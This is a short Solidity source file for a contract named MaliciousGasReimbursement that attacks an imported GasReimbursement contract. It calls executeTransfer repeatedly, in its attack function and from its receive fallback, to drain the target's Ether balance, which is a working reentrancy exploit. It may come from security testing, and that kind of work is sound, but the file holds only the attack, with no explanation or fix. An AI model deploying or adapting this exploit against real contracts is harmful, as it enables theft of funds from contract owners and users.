pragma solidity ^0.8.18;

import "./GasReimbursement.sol";

contract MaliciousGasReimbursement {
    GasReimbursement public gasReimbursement;

    constructor(address _gasReimbursementAddress) {
        gasReimbursement = GasReimbursement(_gasReimbursementAddress);
    }

    function attack() public payable {
        require(msg.value >= gasReimbursement.calculateTotalFee(), "Insufficient Ether sent");
        gasReimbursement.executeTransfer(address(this));
        gasReimbursement.executeTransfer(address(this));
    }

    receive() external payable {
        if (address(gasReimbursement).balance >= gasReimbursement.calculateTotalFee()) {
            gasReimbursement.executeTransfer(address(this));
        }
    }
}